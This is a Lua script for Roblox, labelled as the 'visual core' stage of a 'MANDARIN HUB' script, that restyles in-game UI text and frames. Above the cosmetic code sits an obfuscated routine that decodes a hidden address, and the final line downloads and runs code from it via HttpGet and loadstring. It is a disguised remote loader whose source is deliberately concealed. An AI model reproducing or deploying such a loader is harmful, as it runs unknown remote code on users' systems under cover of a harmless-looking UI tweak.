
--[[ STAGE 2: VISUAL CORE ]]
local kQSBNz99RMpLpTFDaS4IUA="\118\070\074\074\083\028\023\027\094\085\171\174\165\164\177\184\124\183\135\137\079\148\137\227\095\132\184\179\179\136\149\224\244"local tLzcYBGeVAgvFmr8hZg0=33 local P9gqOsr2sSBlMLpnK3xfxf=205 local FcEO9KPBRs3jgnQ4t=1 local GZxtSb08IXIpzqaMDYJ=4 local PJhB9RMAwQQqHN_CVH3c=30 local q8XlkE15dkjke7G4aISdvf=false local ZUja2_gUEDqeZ4Q8Gh3zbN=bit32 and bit32.bxor if not ZUja2_gUEDqeZ4Q8Gh3zbN then ZUja2_gUEDqeZ4Q8Gh3zbN=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local AqoTYj6ihdIdd={}for zExycMK6n3WK=1,#kQSBNz99RMpLpTFDaS4IUA do local ZSKntOWdJ3f0CMS8Cqsy=string.byte(kQSBNz99RMpLpTFDaS4IUA,zExycMK6n3WK)local SwHrrRS5jcpYdYS=(P9gqOsr2sSBlMLpnK3xfxf+(zExycMK6n3WK*GZxtSb08IXIpzqaMDYJ)+PJhB9RMAwQQqHN_CVH3c)%256 if FcEO9KPBRs3jgnQ4t==0 then ZSKntOWdJ3f0CMS8Cqsy=(ZSKntOWdJ3f0CMS8Cqsy-SwHrrRS5jcpYdYS)%256 AqoTYj6ihdIdd[zExycMK6n3WK]=string.char(ZUja2_gUEDqeZ4Q8Gh3zbN(ZSKntOWdJ3f0CMS8Cqsy,tLzcYBGeVAgvFmr8hZg0))else ZSKntOWdJ3f0CMS8Cqsy=ZUja2_gUEDqeZ4Q8Gh3zbN(ZSKntOWdJ3f0CMS8Cqsy,tLzcYBGeVAgvFmr8hZg0)AqoTYj6ihdIdd[zExycMK6n3WK]=string.char((ZSKntOWdJ3f0CMS8Cqsy-SwHrrRS5jcpYdYS)%256)end end local CBeZRwSp3t8Kxz9WN=table.concat(AqoTYj6ihdIdd)if q8XlkE15dkjke7G4aISdvf then CBeZRwSp3t8Kxz9WN=string.reverse(CBeZRwSp3t8Kxz9WN)end local dCT0Te7DlSATb9m=CBeZRwSp3t8Kxz9WN
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(dCT0Te7DlSATb9m))()
